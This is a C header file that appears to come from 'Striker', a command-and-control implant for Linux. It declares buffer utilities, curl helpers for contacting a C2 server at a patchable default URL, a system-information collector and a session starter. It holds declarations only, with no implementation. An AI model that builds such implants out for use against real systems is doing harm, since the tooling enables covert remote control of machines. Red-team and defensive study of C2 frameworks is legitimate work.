/**
 * Header file for the Striker C2 implant for linux.
 *             Author: Umar Abdul
 */

#ifndef STRIKER_H
#define STRIKER_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <curl/curl.h>
#include "cJSON.h"

// Set to non-zero value for debug outputs.
#define STRIKER_DEBUG 1
// The default URL. This is what the patcher will look for.
#define URL_SIZE 512
char baseURL[URL_SIZE] = "http://127.0.0.1:3000";

/**
 * A struct for tracking some session info.
 */
typedef struct{
  char *uid;
  unsigned long delay;
} session;

/**
 * A struct for working with buffers.
 * `buffer` is the buffer (very helpful :)
 * `size` is total number of bytes allocated to it.
 * `used` is used to track number of bytes in use.
 */
typedef struct{
  char *buffer;
  size_t size;
  size_t used;
} buffer;

/**
 * Create a new buffer of `size` bytes, and set the first byte to null.
 * If `size` is zero, the call to malloc() will use 1 to still allocate some memory but buffer.size
 * and buffer.used will be kept at 0.
 */
buffer *create_buffer(size_t size);

// Resize a buffer.
void resize_buffer(buffer *buff, size_t new_size);

/**
 * Append a string `src` to the end of a buffer `dest`.
 * Warning: This will treat `dest` and `str` as null-terminated strings, and also won't resize the buffer to fit.
 */
void append_buffer(buffer *dest, const char *src);

// Convert a buffer to a null-terminated string. Uses the `used` var to determine length.
char *buffer_to_string(buffer *buff);

// Free a buffer.
void free_buffer(buffer *buff);

/**
 * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
 * It does not define any headers.
 * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
 */
CURL *init_curl(const char *path, buffer *buff);

/**
 * Callback function for curl to receive response body inside a buffer.
 * This may be called multiple times with chunks of data, depending on the size of the body.
 */
size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

// Return a json object containing system information.
cJSON *sysinfo();

// Starts the implant.
void start_session();

#endif // STRIKER_H
